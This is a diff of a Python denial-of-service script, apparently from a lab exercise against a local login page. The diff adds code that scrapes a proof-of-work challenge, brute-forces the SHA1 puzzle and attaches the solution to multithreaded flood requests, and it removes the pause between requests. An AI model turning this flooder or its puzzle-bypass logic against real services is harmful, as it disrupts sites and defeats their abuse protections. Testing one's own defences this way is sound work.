@@ -1,12 +1,50 @@
+import base64
 import csv
+import hashlib
 import os
 import threading
 import time
 
 import requests
+from bs4 import BeautifulSoup
 
 
-def dos_request(url, payload, headers):
+def get_challenge(url):
+    session = requests.Session()
+    web = session.get(url)
+    if web.status_code != 200:
+        print("Failed to connect to the web page.")
+        return None
+
+    # Extract the challenge from the web page
+    soup = BeautifulSoup(web.text, "html.parser")
+    scripts = soup.find_all("script")
+
+    for script in scripts:
+        if script.string and "{{ challenge }}" not in script.string:
+            try:
+                challenge = script.string.strip().split("\n")
+                challenge = challenge[0]
+                puzzle = challenge.split('"')[1]
+                return puzzle
+            except IndexError:
+                continue
+    print("Challenge not found in the web page.")
+    return None
+
+
+def solve_puzzle(C):
+    while True:
+        x = os.urandom(4)
+        h = hashlib.sha1(C.encode() + x).digest()
+        last_3_bytes = h[-3:]
+        # check if the last 18 bits are 0
+        val = int.from_bytes(last_3_bytes, "big")
+        if (val & 0x3FFFF) == 0:
+            return base64.b64encode(x).decode()
+
+
+def dos_request(url, headers):
 
     num_requests = 300
     project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -25,6 +63,12 @@ def dos_request(url, payload, headers):
 
     while num_requests > 0:
         try:
+            c = get_challenge(url)
+            if c is None:
+                print("Failed to get challenge C.")
+                break
+            x = solve_puzzle(c)
+            payload = f"email=dos_attack&password=dos_attack&puzzle_c={c}&puzzle_x={x}"
             # record the start time
             start_time = time.time()
             response = requests.request(
@@ -45,7 +89,7 @@ def dos_request(url, payload, headers):
                 # write the data
                 writer.writerow([time.time(), response.status_code, time_taken])
             print(f"Sending DoS request, Status Code: {response.status_code}")
-            time.sleep(0.5)  # Adjust the sleep time as needed 0.1 seconds
+            # time.sleep(0.5)  # Adjust the sleep time as needed 0.1 seconds
             num_requests -= 1
         except Exception as e:
             print(f"An Error Occurred: {e}")
@@ -57,8 +101,8 @@ def Dos_attack():
     # target url (local host) for DoS attack
     url = "http://127.0.0.1:5000/"
 
-    # email and password payload
-    payload = "email=dos_attack&password=dos_attack"
+    # # email and password payload
+    # payload = "email=dos_attack&password=dos_attack"
 
     # headers for the request
     headers = {
@@ -88,7 +132,7 @@ def Dos_attack():
     print("Starting DoS attack...")
 
     for i in range(multi_thread):
-        thread = threading.Thread(target=dos_request, args=(url, payload, headers))
+        thread = threading.Thread(target=dos_request, args=(url, headers))
         thread.start()
         thread_list.append(thread)
         time.sleep(3)
